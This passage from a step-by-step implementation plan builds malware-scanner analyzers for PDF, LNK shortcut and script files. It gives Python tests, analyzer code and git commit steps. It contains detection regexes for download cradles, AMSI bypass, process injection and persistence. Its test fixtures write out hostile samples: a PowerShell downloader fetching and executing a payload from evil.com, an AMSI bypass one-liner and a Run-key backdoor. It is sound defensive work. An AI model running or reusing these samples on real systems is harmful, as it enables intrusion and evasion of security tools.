                "detail": "/GoToR detected via fallback regex",
            })

        if _RE_EMBEDDEDFILE.search(raw):
            features["embedded_files_detected"] = True

        if _RE_URI.search(raw):
            features["uri_actions_detected"] = True

        # Try to extract version from header
        header_match = re.match(rb"[\xef\xbb\xbf\xfe\xff]*%PDF-(\d+\.\d+)", raw[:32])
        if header_match:
            features["version"] = header_match.group(1).decode("ascii")
```

- [ ] **Step 4: Run tests — verify they pass**

Run: `cd worker && poetry run pytest tests/analyzers/test_pdf_analyzer.py -v`

Expected: All tests PASS.

- [ ] **Step 5: Commit**

```bash
git add worker/src/malscan_worker/analyzers/pdf_analyzer.py worker/tests/analyzers/test_pdf_analyzer.py
git commit -m "feat: add PDFAnalyzer with action/JS/launch detection and regex fallback"
```

---

## Task 7: LNK Analyzer

**Files:**
- Create: `worker/src/malscan_worker/analyzers/lnk_analyzer.py`
- Create: `worker/tests/analyzers/test_lnk_analyzer.py`

- [ ] **Step 1: Write failing tests for LNKAnalyzer**

Create `worker/tests/analyzers/test_lnk_analyzer.py`:

```python
"""Tests for LNKAnalyzer."""

import struct
import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest
from malscan_worker.analyzers.lnk_analyzer import LNKAnalyzer
from malscan_worker.stages.base import StageContext, StageResult


def _make_ctx(file_path: Path, mime: str = "", original_filename: str = "test.lnk") -> StageContext:
    ctx = StageContext(
        job_id=str(uuid.uuid4()),
        file_id=str(uuid.uuid4()),
        storage_key="deadbeef" * 8,
        sha256="deadbeef" * 8,
        original_filename=original_filename,
        file_path=file_path,
    )
    ctx.previous_results = [
        StageResult(
            stage_name="file-type",
            status="ok",
            started_at=datetime.now(timezone.utc),
            ended_at=datetime.now(timezone.utc),
            duration_ms=1,
            findings={"mime_type": mime},
            artifacts=[],
        )
    ]
    return ctx


# LNK file magic: header size (4c 00 00 00) + CLSID
LNK_MAGIC = (
    b"\x4c\x00\x00\x00"
    b"\x01\x14\x02\x00\x00\x00\x00\x00"
    b"\xc0\x00\x00\x00\x00\x00\x00\x46"
)


class TestLNKAnalyzerCanHandle:
    def setup_method(self):
        self.analyzer = LNKAnalyzer()

    def test_handles_lnk_magic(self, tmp_path):
        f = tmp_path / "test.lnk"
        content = LNK_MAGIC + b"\x00" * 100
        f.write_bytes(content)
        assert self.analyzer.can_handle(f, "", content[:32]) is True

    def test_handles_lnk_mime(self, tmp_path):
        f = tmp_path / "test.lnk"
        f.write_bytes(b"\x00" * 32)
        assert self.analyzer.can_handle(f, "application/x-ms-shortcut", b"\x00" * 32) is True

    def test_rejects_non_lnk(self, tmp_path):
        f = tmp_path / "test.exe"
        f.write_bytes(b"MZ" + b"\x00" * 30)
        assert self.analyzer.can_handle(f, "application/x-dosexec", b"MZ" + b"\x00" * 30) is False


@pytest.mark.asyncio
class TestLNKAnalyzerAnalyze:
    def setup_method(self):
        self.analyzer = LNKAnalyzer()

    async def test_analyze_corrupt_lnk(self, tmp_path):
        """Corrupt LNK should return partial results with error, not crash."""
        f = tmp_path / "corrupt.lnk"
        f.write_bytes(LNK_MAGIC + b"\x00" * 50)
        ctx = _make_ctx(f)

        result = await self.analyzer.analyze(f, ctx)

        assert result.analyzer_name == "lnk"
        # Should have partial results or errors, not crash
        assert isinstance(result.features, dict)

    async def test_cmd_chain_indicator_detection(self, tmp_path):
        """Test that _check_command_chain correctly identifies suspicious patterns."""
        # We test the indicator detection logic directly rather than
        # constructing a full valid LNK (which is complex binary format).
        # The analyzer extracts target+args then checks patterns.
        from malscan_worker.analyzers.lnk_analyzer import _check_indicators

        indicators: list = []
        features = {
            "target_path": "C:\\Windows\\System32\\cmd.exe",
            "arguments": "/c powershell -enc SQBFAFgA",
            "command_chain": "C:\\Windows\\System32\\cmd.exe /c powershell -enc SQBFAFgA",
            "show_command": "SW_HIDE",
        }
        _check_indicators(features, indicators)

        types = [i["type"] for i in indicators]
        assert "cmd_chain" in types
        assert "encoded_command" in types
        assert "hidden_execution" in types
```

- [ ] **Step 2: Run tests — verify they fail**

Run: `cd worker && poetry run pytest tests/analyzers/test_lnk_analyzer.py -v`

Expected: ImportError.

- [ ] **Step 3: Implement LNKAnalyzer**

Create `worker/src/malscan_worker/analyzers/lnk_analyzer.py`:

```python
"""LNK (Windows Shortcut) format analyzer."""

from __future__ import annotations

import asyncio
import base64
import re
from pathlib import Path
from typing import Any

import structlog

from malscan_worker.analyzers.base import AnalyzerResult, FormatAnalyzer
from malscan_worker.stages.base import StageContext

log = structlog.get_logger()

# ---------------------------------------------------------------------------
# Optional dependency
# ---------------------------------------------------------------------------
try:
    import LnkParse3

    HAS_LNKPARSE = True
except ImportError:
    HAS_LNKPARSE = False

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
MAX_LNK_SIZE = 10 * 1024 * 1024  # 10 MB
LNK_MAGIC = b"\x4c\x00\x00\x00\x01\x14\x02\x00"
LNK_MIMES = {"application/x-ms-shortcut", "application/x-ms-lnk"}

# Suspicious targets that invoke scripting engines
_SCRIPTING_TARGETS = {
    "cmd.exe", "powershell.exe", "pwsh.exe", "mshta.exe",
    "wscript.exe", "cscript.exe", "rundll32.exe", "regsvr32.exe",
}

# Download command patterns
_DOWNLOAD_RE = re.compile(
    r"(certutil\s.*-urlcache|bitsadmin\s.*/transfer|"
    r"Invoke-WebRequest|wget\s|curl\s|DownloadFile|DownloadString|"
    r"Net\.WebClient|Start-BitsTransfer)",
    re.IGNORECASE,
)

# Encoded command pattern
_ENCODED_CMD_RE = re.compile(r"-(?:enc|encodedcommand)\s+([A-Za-z0-9+/=]{20,})", re.IGNORECASE)

# Environment variable abuse
_ENV_VAR_RE = re.compile(r"%(COMSPEC|APPDATA|TEMP|TMP|USERPROFILE|LOCALAPPDATA|PROGRAMDATA)%", re.IGNORECASE)

# Suspicious target paths
_SUSPICIOUS_PATHS = re.compile(
    r"(\\Temp\\|\\tmp\\|\\AppData\\|\\Recycle\.Bin\\|\\Downloads\\)",
    re.IGNORECASE,
)

# Severity → score weights
_SEVERITY_SCORES = {"critical": 25, "high": 15, "medium": 8, "low": 3}


def _compute_risk_score(indicators: list[dict[str, Any]]) -> int:
    score = 0
    for ind in indicators:
        score += _SEVERITY_SCORES.get(ind.get("severity", ""), 0)
    return min(score, 100)


def _check_indicators(features: dict[str, Any], indicators: list[dict[str, Any]]) -> None:
    """Check extracted LNK features for suspicious patterns and add indicators."""
    target = features.get("target_path", "")
    arguments = features.get("arguments", "")
    command_chain = features.get("command_chain", "")
    show_command = features.get("show_command", "")
    icon_location = features.get("icon_location", "")
    working_dir = features.get("working_dir", "")

    target_lower = target.lower() if target else ""
    target_basename = target_lower.rsplit("\\", 1)[-1] if target_lower else ""
    args_str = arguments or ""

    # cmd_chain: scripting engine target with arguments
    if target_basename in _SCRIPTING_TARGETS and args_str:
        indicators.append({
            "type": "cmd_chain",
            "severity": "critical",
            "detail": f"Scripting engine invocation: {target_basename} with arguments",
            "evidence": {"target": target, "arguments": args_str[:500]},
        })

    # download_command
    if _DOWNLOAD_RE.search(command_chain):
        indicators.append({
            "type": "download_command",
            "severity": "critical",
            "detail": "Download command detected in LNK arguments",
            "evidence": {"command_chain": command_chain[:500]},
        })

    # encoded_command
    enc_match = _ENCODED_CMD_RE.search(command_chain)
    if enc_match:
        encoded_payload = enc_match.group(1)
        decoded = ""
        try:
            raw = base64.b64decode(encoded_payload)
            decoded = raw.decode("utf-16-le", errors="replace")[:500]
        except Exception:
            pass
        indicators.append({
            "type": "encoded_command",
            "severity": "critical",
            "detail": f"Encoded PowerShell command detected",
            "evidence": {"encoded": encoded_payload[:200], "decoded": decoded},
        })

    # hidden_execution
    if show_command in ("SW_HIDE", "0", 0) or str(show_command) == "0":
        indicators.append({
            "type": "hidden_execution",
            "severity": "high",
            "detail": f"ShowCommand set to {show_command} (hidden window)",
        })
    elif show_command in ("SW_SHOWMINIMIZED", "7", 7) or str(show_command) == "7":
        indicators.append({
            "type": "hidden_execution",
            "severity": "high",
            "detail": f"ShowCommand set to {show_command} (minimized window)",
        })

    # network_target
    if "\\\\" in target or "\\\\" in args_str:
        indicators.append({
            "type": "network_target",
            "severity": "high",
            "detail": "UNC network path referenced",
            "evidence": {"target": target, "arguments": args_str[:200]},
        })

    # suspicious_target
    if _SUSPICIOUS_PATHS.search(target):
        indicators.append({
            "type": "suspicious_target",
            "severity": "high",
            "detail": f"Target in suspicious location: {target}",
        })

    # icon_mismatch
    icon_lower = (icon_location or "").lower()
    doc_icons = ("wordicon", "excel", "powerpnt", "winword", "pdficon")
    if icon_lower and any(ic in icon_lower for ic in doc_icons):
        if target_basename in _SCRIPTING_TARGETS:
            indicators.append({
                "type": "icon_mismatch",
                "severity": "medium",
                "detail": f"Icon mimics document ({icon_location}) but target is {target_basename}",
            })

    # long_arguments
    if len(args_str) > 500:
        indicators.append({
            "type": "long_arguments",
            "severity": "medium",
            "detail": f"Arguments length {len(args_str)} chars (>500)",
        })

    # environment_variable_abuse
    if _ENV_VAR_RE.search(target) or _ENV_VAR_RE.search(args_str):
        indicators.append({
            "type": "environment_variable_abuse",
            "severity": "medium",
            "detail": "Environment variable references in target or arguments",
        })

    # suspicious_working_dir
    working_lower = (working_dir or "").lower()
    if working_lower and any(s in working_lower for s in ("temp", "downloads", "tmp")):
        indicators.append({
            "type": "suspicious_working_dir",
            "severity": "low",
            "detail": f"Working directory is suspicious: {working_dir}",
        })


class LNKAnalyzer(FormatAnalyzer):
    """Analyze Windows LNK shortcut files for suspicious targets and arguments."""

    @property
    def name(self) -> str:
        return "lnk"

    def can_handle(self, file_path: Path, mime: str, magic: bytes) -> bool:
        if mime in LNK_MIMES:
            return True
        return magic[:8] == LNK_MAGIC

    async def analyze(self, file_path: Path, ctx: StageContext) -> AnalyzerResult:
        # Size guard
        try:
            file_size = file_path.stat().st_size
        except OSError:
            return AnalyzerResult(
                analyzer_name=self.name, format_type="LNK",
                errors=["Cannot stat file"],
            )
        if file_size > MAX_LNK_SIZE:
            return AnalyzerResult(
                analyzer_name=self.name, format_type="LNK",
                errors=[f"File too large for LNK analysis — skipped ({file_size} bytes)"],
            )

        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._analyze_sync, file_path)

    def _analyze_sync(self, file_path: Path) -> AnalyzerResult:
        indicators: list[dict[str, Any]] = []
        features: dict[str, Any] = {}
        extracted_strings: list[str] = []
        errors: list[str] = []

        parsed = False
        if HAS_LNKPARSE:
            try:
                with open(file_path, "rb") as f:
                    lnk = LnkParse3.lnk_file(f)

                lnk_json = lnk.get_json()
                header = lnk_json.get("header", {})
                link_info = lnk_json.get("link_info", {})
                data = lnk_json.get("data", {})
                target_info = lnk_json.get("target", {})
                extra = lnk_json.get("extra", {})

                features["target_path"] = data.get("relative_path", link_info.get("local_base_path", ""))
                features["arguments"] = data.get("command_line_arguments", "")
                features["working_dir"] = data.get("working_dir", "")
                features["icon_location"] = data.get("icon_location", "")
                features["description"] = data.get("description", "")
                features["relative_path"] = data.get("relative_path", "")
                features["local_base_path"] = link_info.get("local_base_path", "")
                features["network_path"] = link_info.get("common_network_relative_link", {}).get("net_name", "")

                # Timestamps
                features["creation_time"] = header.get("creation_time", "")
                features["modification_time"] = header.get("write_time", "")
                features["access_time"] = header.get("access_time", "")
                features["file_size"] = header.get("file_size", 0)
                features["file_attributes"] = header.get("file_attributes", "")

                # Show command
                show_cmd = header.get("show_command", "")
                features["show_command"] = show_cmd

                # Hot key
                features["hot_key"] = header.get("hotkey", "")

                # Tracker data
                tracker = extra.get("TRACKER_PROPS", {})
                if tracker:
                    features["tracker_data"] = {
                        "machine_id": tracker.get("machine_id", ""),
                        "mac_address": tracker.get("mac_address", ""),
                    }

                # Build command chain
                target = features.get("local_base_path", "") or features.get("target_path", "")
                args = features.get("arguments", "")
                features["target_path"] = target
                features["command_chain"] = f"{target} {args}".strip() if target or args else ""

                extracted_strings.append(features["command_chain"])
                if features.get("description"):
                    extracted_strings.append(features["description"])

                parsed = True

            except Exception as e:
                errors.append(f"LnkParse3 error: {e}")
                log.warning("lnk_parse_error", error=str(e))

        if not parsed:
            # Fallback: parse fixed LNK header (76 bytes)
            try:
                self._fallback_parse(file_path, features, errors)
            except Exception as e:
                errors.append(f"LNK fallback parse error: {e}")

        # Check indicators
        _check_indicators(features, indicators)

        # Decode encoded command payload into extracted_strings
        for ind in indicators:
            if ind["type"] == "encoded_command":
                decoded = ind.get("evidence", {}).get("decoded", "")
                if decoded:
                    extracted_strings.append(decoded)

        risk_score = _compute_risk_score(indicators)
        risk_factors = [ind["detail"] for ind in indicators if ind["severity"] in ("critical", "high", "medium")]

        return AnalyzerResult(
            analyzer_name=self.name,
            format_type="LNK",
            indicators=indicators,
            features=features,
            extracted_strings=extracted_strings[:200],
            risk_score=risk_score,
            risk_factors=risk_factors,
            errors=errors,
            extracted_artifacts=[],
        )

    def _fallback_parse(self, file_path: Path, features: dict[str, Any], errors: list[str]) -> None:
        """Parse the fixed 76-byte LNK header manually."""
        import struct

        with open(file_path, "rb") as f:
            header = f.read(76)

        if len(header) < 76:
            errors.append("LNK file too short for header parsing")
            return

        # Bytes 20-23: LinkFlags
        # Bytes 24-27: FileAttributes
        file_attrs = struct.unpack_from("<I", header, 24)[0]
        features["file_attributes"] = hex(file_attrs)

        # Bytes 28-35: CreationTime (FILETIME)
        # Bytes 36-43: AccessTime
        # Bytes 44-51: WriteTime
        # Bytes 52-55: FileSize
        file_size = struct.unpack_from("<I", header, 52)[0]
        features["file_size"] = file_size

        # Bytes 60-63: ShowCommand
        show_cmd = struct.unpack_from("<I", header, 60)[0]
        features["show_command"] = str(show_cmd)

        errors.append("Parsed via fallback header-only mode (LnkParse3 unavailable or failed)")
```

- [ ] **Step 4: Run tests — verify they pass**

Run: `cd worker && poetry run pytest tests/analyzers/test_lnk_analyzer.py -v`

Expected: All tests PASS.

- [ ] **Step 5: Commit**

```bash
git add worker/src/malscan_worker/analyzers/lnk_analyzer.py worker/tests/analyzers/test_lnk_analyzer.py
git commit -m "feat: add LNKAnalyzer with command chain and indicator detection"
```

---

## Task 8: Script Analyzer

**Files:**
- Create: `worker/src/malscan_worker/analyzers/script_analyzer.py`
- Create: `worker/tests/analyzers/test_script_analyzer.py`

- [ ] **Step 1: Write failing tests for ScriptAnalyzer**

Create `worker/tests/analyzers/test_script_analyzer.py`:

```python
"""Tests for ScriptAnalyzer."""

import uuid
from datetime import datetime, timezone
from pathlib import Path

import pytest
from malscan_worker.analyzers.script_analyzer import ScriptAnalyzer
from malscan_worker.stages.base import StageContext, StageResult


def _make_ctx(file_path: Path, mime: str = "", original_filename: str = "test.ps1") -> StageContext:
    ctx = StageContext(
        job_id=str(uuid.uuid4()),
        file_id=str(uuid.uuid4()),
        storage_key="deadbeef" * 8,
        sha256="deadbeef" * 8,
        original_filename=original_filename,
        file_path=file_path,
    )
    ctx.previous_results = [
        StageResult(
            stage_name="file-type",
            status="ok",
            started_at=datetime.now(timezone.utc),
            ended_at=datetime.now(timezone.utc),
            duration_ms=1,
            findings={"mime_type": mime},
            artifacts=[],
        )
    ]
    return ctx


class TestScriptAnalyzerCanHandle:
    def setup_method(self):
        self.analyzer = ScriptAnalyzer()

    def test_handles_ps1_by_extension(self, tmp_path):
        f = tmp_path / "test.ps1"
        f.write_bytes(b"Write-Host 'hello'")
        ctx = _make_ctx(f, original_filename="test.ps1")
        assert self.analyzer.can_handle(f, "", f.read_bytes()[:32]) is True

    def test_handles_js_by_mime(self, tmp_path):
        f = tmp_path / "test.js"
        f.write_bytes(b"var x = 1;")
        assert self.analyzer.can_handle(f, "application/javascript", f.read_bytes()[:32]) is True

    def test_handles_vbs_by_extension(self, tmp_path):
        f = tmp_path / "test.vbs"
        f.write_bytes(b"Dim x")
        assert self.analyzer.can_handle(f, "", f.read_bytes()[:32]) is True

    def test_handles_bat_by_extension(self, tmp_path):
        f = tmp_path / "test.bat"
        f.write_bytes(b"@echo off")
        assert self.analyzer.can_handle(f, "", f.read_bytes()[:32]) is True

    def test_handles_hta_by_extension(self, tmp_path):
        f = tmp_path / "test.hta"
        f.write_bytes(b"<HTA:APPLICATION>")
        assert self.analyzer.can_handle(f, "", f.read_bytes()[:32]) is True

    def test_handles_powershell_content_sniff(self, tmp_path):
        """File with no known extension but PowerShell content should match."""
        f = tmp_path / "test.txt"
        content = b"$client = New-Object Net.WebClient\n$client.DownloadFile('http://evil.com/mal.exe', 'c:\\temp\\mal.exe')"
        f.write_bytes(content)
        assert self.analyzer.can_handle(f, "text/plain", content[:32]) is True

    def test_rejects_binary(self, tmp_path):
        """Binary file should not match."""
        f = tmp_path / "test.bin"
        f.write_bytes(bytes(range(256)) * 4)
        assert self.analyzer.can_handle(f, "application/octet-stream", bytes(range(32))) is False

    def test_rejects_non_script(self, tmp_path):
        f = tmp_path / "test.pdf"
        f.write_bytes(b"%PDF-1.4 hello world" + b"\x00" * 12)
        assert self.analyzer.can_handle(f, "application/pdf", b"%PDF-1.4 hello world" + b"\x00" * 12) is False


@pytest.mark.asyncio
class TestScriptAnalyzerAnalyze:
    def setup_method(self):
        self.analyzer = ScriptAnalyzer()

    async def test_analyze_simple_powershell(self, tmp_path):
        f = tmp_path / "test.ps1"
        f.write_bytes(b"Write-Host 'Hello World'\nGet-Process")
        ctx = _make_ctx(f, original_filename="test.ps1")

        result = await self.analyzer.analyze(f, ctx)

        assert result.analyzer_name == "script"
        assert result.format_type == "PowerShell"
        assert "line_count" in result.features
        assert result.features["line_count"] == 2
        assert result.risk_score >= 0

    async def test_analyze_download_and_execute(self, tmp_path):
        """Script with download + execute should trigger critical indicator."""
        f = tmp_path / "dropper.ps1"
        content = (
            b"$wc = New-Object Net.WebClient\n"
            b"$wc.DownloadFile('http://evil.com/payload.exe', 'C:\\Temp\\payload.exe')\n"
            b"Invoke-Expression (Get-Content C:\\Temp\\payload.exe)\n"
        )
        f.write_bytes(content)
        ctx = _make_ctx(f, original_filename="dropper.ps1")

        result = await self.analyzer.analyze(f, ctx)

        types = [i["type"] for i in result.indicators]
        assert "download_and_execute" in types
        assert any(i["severity"] == "critical" for i in result.indicators)

    async def test_analyze_obfuscated_script(self, tmp_path):
        """Heavily obfuscated script should produce high obfuscation score."""
        f = tmp_path / "obf.ps1"
        # Lots of char() calls, string concatenation, short variable names
        lines = []
        for i in range(50):
            lines.append(f"$a=[char]({65+i%26})+[char]({66+i%26})+[char]({67+i%26})")
        content = "\n".join(lines).encode()
        f.write_bytes(content)
        ctx = _make_ctx(f, original_filename="obf.ps1")

        result = await self.analyzer.analyze(f, ctx)

        assert result.features.get("obfuscation_score", 0) > 0

    async def test_analyze_registry_persistence(self, tmp_path):
        f = tmp_path / "persist.ps1"
        content = b"Set-ItemProperty -Path 'HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Backdoor' -Value 'C:\\mal.exe'"
        f.write_bytes(content)
        ctx = _make_ctx(f, original_filename="persist.ps1")

        result = await self.analyzer.analyze(f, ctx)

        types = [i["type"] for i in result.indicators]
        assert "registry_persistence" in types

    async def test_analyze_amsi_bypass(self, tmp_path):
        f = tmp_path / "bypass.ps1"
        content = b"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
        f.write_bytes(content)
        ctx = _make_ctx(f, original_filename="bypass.ps1")

        result = await self.analyzer.analyze(f, ctx)

        types = [i["type"] for i in result.indicators]
        assert "amsi_bypass" in types

    async def test_analyze_javascript_wscript(self, tmp_path):
        f = tmp_path / "test.js"
        content = b"var shell = new ActiveXObject('WScript.Shell');\nshell.Run('cmd /c calc.exe');"
        f.write_bytes(content)
        ctx = _make_ctx(f, "application/javascript", original_filename="test.js")

        result = await self.analyzer.analyze(f, ctx)

        assert result.format_type == "JavaScript"
        assert result.features.get("process_operations") or result.risk_score > 0

    async def test_analyze_vbscript(self, tmp_path):
        f = tmp_path / "test.vbs"
        content = b"Dim objShell\nSet objShell = CreateObject(\"WScript.Shell\")\nobjShell.Run \"cmd /c whoami\""
        f.write_bytes(content)
        ctx = _make_ctx(f, "text/vbscript", original_filename="test.vbs")

        result = await self.analyzer.analyze(f, ctx)

        assert result.format_type == "VBScript"

    async def test_analyze_batch(self, tmp_path):
        f = tmp_path / "test.bat"
        content = b"@echo off\nset x=hello\necho %x%\n"
        f.write_bytes(content)
        ctx = _make_ctx(f, "", original_filename="test.bat")

        result = await self.analyzer.analyze(f, ctx)

        assert result.format_type == "Batch"
```

- [ ] **Step 2: Run tests — verify they fail**

Run: `cd worker && poetry run pytest tests/analyzers/test_script_analyzer.py -v`

Expected: ImportError.

- [ ] **Step 3: Implement ScriptAnalyzer**

Create `worker/src/malscan_worker/analyzers/script_analyzer.py`:

```python
"""Script (PowerShell / JavaScript / VBScript / Batch / HTA) format analyzer."""

from __future__ import annotations

import asyncio
import base64
import re
from pathlib import Path
from typing import Any

import structlog

from malscan_worker.analyzers.base import AnalyzerResult, FormatAnalyzer
from malscan_worker.stages.base import StageContext

log = structlog.get_logger()

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
MAX_SCRIPT_SIZE = 1 * 1024 * 1024  # 1 MB analyzed

# Extension → script type mapping
_EXT_MAP: dict[str, str] = {
    ".ps1": "PowerShell", ".psm1": "PowerShell", ".psd1": "PowerShell",
    ".js": "JavaScript", ".jse": "JavaScript", ".wsc": "JavaScript", ".wsf": "JavaScript",
    ".vbs": "VBScript", ".vbe": "VBScript",
    ".bat": "Batch", ".cmd": "Batch",
    ".hta": "HTA",
}

# MIME → script type mapping
_MIME_MAP: dict[str, str] = {
    "application/x-powershell": "PowerShell",
    "text/x-powershell": "PowerShell",
    "application/javascript": "JavaScript",
    "text/javascript": "JavaScript",
    "text/vbscript": "VBScript",
    "application/x-bat": "Batch",
    "application/hta": "HTA",
}

# Content sniff patterns (order matters: first match wins)
_CONTENT_SNIFF: list[tuple[str, re.Pattern]] = [
    ("PowerShell", re.compile(rb"(?:^|\s)(?:param\s*\(|function\s+\w|\$\w+\s*=|(?:Get|Set|New|Write|Invoke)-\w)", re.IGNORECASE)),
    ("JavaScript", re.compile(rb"(?:var\s+\w|function\s+\w|WScript\.|ActiveXObject|new\s+ActiveX)", re.IGNORECASE)),
    ("VBScript", re.compile(rb"(?:Dim\s+\w|Sub\s+\w|Function\s+\w|Set\s+\w+\s*=|WScript\.)", re.IGNORECASE)),
    ("Batch", re.compile(rb"(?:@echo\s+off|set\s+\w+=|goto\s+\w|if\s+exist)", re.IGNORECASE)),
    ("HTA", re.compile(rb"<HTA:APPLICATION|<script\b", re.IGNORECASE)),
]

# --- Indicator regex patterns ---

# Download patterns
_DOWNLOAD_RE = re.compile(
    r"(Net\.WebClient|DownloadFile|DownloadString|Invoke-WebRequest|"
    r"Start-BitsTransfer|certutil\s.*-urlcache|bitsadmin\s.*/transfer|"
    r"wget\s|curl\s|XMLHTTP|ServerXMLHTTP|WinHttp)",
    re.IGNORECASE,
)

# Execution patterns
_EXEC_RE = re.compile(
    r"(Invoke-Expression|IEX\s*\(|\.Invoke\(|eval\s*\(|Execute\s*\(|"
    r"ExecuteGlobal|ScriptControl|WScript\.Shell.*\.Run|Shell\.Application.*\.ShellExecute|"
    r"Start-Process|cmd\s*/c|powershell\s+-)",
    re.IGNORECASE,
)

# Process injection
_INJECTION_RE = re.compile(
    r"(VirtualAlloc|WriteProcessMemory|CreateThread|CreateRemoteThread|"
    r"NtQueueApcThread|QueueUserAPC|NtUnmapViewOfSection|"
    r"\[System\.Runtime\.InteropServices\.Marshal\])",
    re.IGNORECASE,
)

# Registry persistence
_REGISTRY_PERSIST_RE = re.compile(
    r"(CurrentVersion\\Run\b|CurrentVersion\\RunOnce\b|"
    r"Set-ItemProperty.*\\Run|New-ItemProperty.*\\Run|"
    r"RegWrite.*\\Run)",
    re.IGNORECASE,
)

# Scheduled task
_SCHTASK_RE = re.compile(
    r"(schtasks\s*/create|Register-ScheduledTask|New-ScheduledTask)",
    re.IGNORECASE,
)

# Service creation
_SERVICE_RE = re.compile(
    r"(sc\s+create\s|New-Service\s|sc\.exe\s+create)",
    re.IGNORECASE,
)

# AMSI bypass
_AMSI_RE = re.compile(
    r"(amsiInitFailed|AmsiUtils|amsi\.dll|Disable-Amsi|"
    r"AmsiScanBuffer|amsiContext)",
    re.IGNORECASE,
)

# Execution policy bypass
_EXEC_POLICY_RE = re.compile(r"-ExecutionPolicy\s+Bypass", re.IGNORECASE)

# WMI execution
_WMI_RE = re.compile(
    r"(Win32_Process.*Create|Get-WmiObject.*Win32_Process|"
    r"Invoke-WmiMethod|wmic\s+process\s+call\s+create)",
    re.IGNORECASE,
)

# Environment discovery
_DISCOVERY_RE = re.compile(
    r"(\$env:COMPUTERNAME|\$env:USERNAME|\$env:USERDOMAIN|"
    r"hostname|whoami|systeminfo|ipconfig|net\s+user)",
    re.IGNORECASE,
)

# Sleep/delay
_SLEEP_RE = re.compile(
    r"(Start-Sleep|sleep\s+\d|timeout\s+/t|Thread\.Sleep|WScript\.Sleep)",
    re.IGNORECASE,
)

# Base64 encoded command
_ENCODED_CMD_RE = re.compile(r"-(?:enc|encodedcommand)\s+([A-Za-z0-9+/=]{20,})", re.IGNORECASE)

# Network indicators
_URL_RE = re.compile(r"https?://[^\s'\"<>]+", re.IGNORECASE)
_IP_RE = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
_DOMAIN_RE = re.compile(r"\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+(?:com|net|org|io|xyz|ru|cn|tk|ml|ga|cf|info|biz|top)\b", re.IGNORECASE)

# Obfuscation signals
_CHR_RE = re.compile(r"(?:chr|Chr|String\.fromCharCode)\s*\(", re.IGNORECASE)
_REPLACE_CHAIN_RE = re.compile(r"\.replace\s*\(", re.IGNORECASE)
_JOIN_SPLIT_RE = re.compile(r"(?:-join|-split)\s", re.IGNORECASE)

# Severity → score weights
_SEVERITY_SCORES = {"critical": 25, "high": 15, "medium": 8, "low": 3}


def _compute_risk_score(indicators: list[dict[str, Any]]) -> int:
    score = 0
    for ind in indicators:
        score += _SEVERITY_SCORES.get(ind.get("severity", ""), 0)
    return min(score, 100)


def _is_text_content(data: bytes) -> bool:
    """Check if data is likely text (UTF-8/Latin-1, >85% printable)."""
    if not data:
        return False
    try:
        text = data.decode("utf-8")
    except UnicodeDecodeError:
        try:
            text = data.decode("latin-1")
        except UnicodeDecodeError:
            return False
    printable = sum(1 for c in text[:4096] if c.isprintable() or c in "\n\r\t")
    return printable / max(len(text[:4096]), 1) > 0.85


def _compute_obfuscation_score(content: str, line_count: int) -> int:
    """Compute obfuscation heuristic score (0-100)."""
    score = 0

    # Average identifier length < 3 chars
    identifiers = re.findall(r"\b[a-zA-Z_]\w*\b", content[:50000])
    if identifiers:
        avg_len = sum(len(i) for i in identifiers) / len(identifiers)
        if avg_len < 3:
            score += 15

    # Non-alphanumeric ratio > 40%
    sample = content[:10000]
    non_alnum = sum(1 for c in sample if not c.isalnum() and c not in " \n\r\t")
    if sample and non_alnum / max(len(sample), 1) > 0.4:
        score += 15

    # String concat density
    concat_count = sample.count("+") + sample.count("&")
    lines_sample = max(line_count, 1)
    if concat_count > 20 * (lines_sample / 100):
        score += 15

    # chr()/fromCharCode() calls
    chr_count = len(_CHR_RE.findall(content[:50000]))
    if chr_count > 5:
        score += 20

    # Long base64 strings
    b64_matches = re.findall(r"[A-Za-z0-9+/=]{100,}", content[:100000])
    if b64_matches:
        score += 10

    # Replace chains
    replace_count = len(_REPLACE_CHAIN_RE.findall(content[:50000]))
    if replace_count > 3:
        score += 10

    # -join/-split with char arrays
    if _JOIN_SPLIT_RE.search(content[:50000]):
        score += 10

    # Single-letter variables dominate
    single_letter = [i for i in identifiers if len(i) == 1]
    if identifiers and len(single_letter) / max(len(identifiers), 1) > 0.7:
        score += 5

    return min(score, 100)


class ScriptAnalyzer(FormatAnalyzer):
    """Analyze script files (PowerShell, JS, VBS, Batch, HTA) for malicious patterns."""

    @property
    def name(self) -> str:
        return "script"

    def can_handle(self, file_path: Path, mime: str, magic: bytes) -> bool:
        # Check MIME
        if mime in _MIME_MAP:
            return True

        # Check extension
        ext = file_path.suffix.lower()
        if ext in _EXT_MAP:
            return True

        # Content sniff: must be text first
        if not _is_text_content(magic):
            return False
        # Read more content for sniffing
        try:
            with open(file_path, "rb") as f:
                head = f.read(4096)
        except OSError:
            return False
        if not _is_text_content(head):
            return False
        for _, pattern in _CONTENT_SNIFF:
            if pattern.search(head):
                return True
        return False

    async def analyze(self, file_path: Path, ctx: StageContext) -> AnalyzerResult:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(
            None, self._analyze_sync, file_path, ctx.original_filename
        )

    def _analyze_sync(self, file_path: Path, original_filename: str) -> AnalyzerResult:
        indicators: list[dict[str, Any]] = []
        features: dict[str, Any] = {}
        extracted_strings: list[str] = []
        errors: list[str] = []

        # Read content
        try:
            raw = file_path.read_bytes()[:MAX_SCRIPT_SIZE]
        except OSError as e:
            return AnalyzerResult(
                analyzer_name=self.name, format_type="Script",
                errors=[f"Cannot read file: {e}"],
            )

        # Decode to text
        try:
            content = raw.decode("utf-8")
        except UnicodeDecodeError:
            try:
                content = raw.decode("latin-1")
            except UnicodeDecodeError:
                return AnalyzerResult(
                    analyzer_name=self.name, format_type="Script",
                    errors=["Cannot decode file as text"],
                )

        # Determine script type
        script_type = self._detect_type(file_path, original_filename, raw)
        features["script_type"] = script_type

        lines = content.splitlines()
        line_count = len(lines)
        features["line_count"] = line_count

        # Obfuscation score
        obf_score = _compute_obfuscation_score(content, line_count)
        features["obfuscation_score"] = obf_score

        if obf_score > 60:
            indicators.append({
